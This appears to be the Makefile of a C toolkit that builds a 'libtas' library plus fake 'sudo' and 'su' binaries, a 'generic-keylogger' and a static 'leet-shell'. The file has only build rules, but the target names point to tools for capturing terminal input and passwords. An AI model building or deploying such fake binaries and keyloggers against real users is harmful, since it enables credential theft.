CFLAGS+=-Wall -Wextra -I$(PWD)

TAS = \
	globals.o tas-execv.o \
	tty.o xreadlink.o getinode.o

OBJS = $(addprefix .obj/, $(TAS))

.PHONY: all
all: .obj/libtas.a

.obj/libtas.a: $(OBJS)
	@echo "  AR $@"
	@ar cr $@ $^

# __dependencies__

.obj/tas-execv.o: .obj/globals.o .obj/getinode.o
.obj/tty.o: LDFLAGS+=-l:util.a

.obj/%.o: tas/%.c tas/%.h

# __end__

.obj/%.o: tas/%.c
	@echo "  CC $@"
	@$(CC) $(CFLAGS) -c -o $@ $< $(LDFLAGS)

.PHONY: sudo su generic-keylogger
sudo: .obj/libtas.a
	@$(MAKE) -C fakebins/sudo

su: .obj/libtas.a
	@$(MAKE) -C fakebins/su

generic-keylogger: .obj/libtas.a
	@$(MAKE) -C fakebins/generic-keylogger

fun/leet-shell: fun/leet-shell.c .obj/libtas.a
	@echo "  CC $@"
	@$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^ -static -lutil

clean:
	rm -f $(OBJS) .obj/libtas.a sudo su generic-keylogger fun/leet-shell fakebins/*/config.h
